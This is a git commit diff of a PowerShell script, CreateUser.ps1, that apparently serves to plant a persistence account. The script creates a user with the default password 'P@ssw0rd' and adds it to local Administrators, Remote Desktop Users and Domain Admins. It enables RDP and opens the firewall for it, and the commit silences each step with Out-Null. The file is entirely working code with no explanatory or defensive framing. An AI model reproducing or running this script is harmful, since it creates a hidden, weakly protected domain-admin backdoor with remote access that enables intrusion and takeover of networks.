97d69da84f1933a581bbf6d54efaf12ac5c8f809
Said Hussein <123634164+cyb4x@users.noreply.github.com>
2025-04-28 02:24:36 +0300

    Update CreateUser.ps1

--- CreateUser.ps1
+++ CreateUser.ps1
@@ -1,20 +1,18 @@
-param(
+param (
     [string]$username,
     [string]$password = "P@ssw0rd"
 )
 
-net user $username $password /add
-net localgroup administrators $username /add
-net localgroup "Remote Desktop Users" $username /add
-
 try {
-    net group "Domain Admins" $username /add /domain
-} catch {
-    Write-Host "Could not add $username to Domain Admins"
+    net user $username $password /add | Out-Null
+    net localgroup administrators $username /add | Out-Null
+    net localgroup "Remote Desktop Users" $username /add | Out-Null
+    net group "Domain Admins" $username /add /domain 2>&1 | Out-Null
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 | Out-Null
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null
+    netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes | Out-Null
+    Write-Host "Account created for $username with password $password"
 }
-
-Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
-
-Write-Host "Account created for $username with password $password"
+catch {
+    Write-Host "An error occurred: $_" -ForegroundColor Red
+}
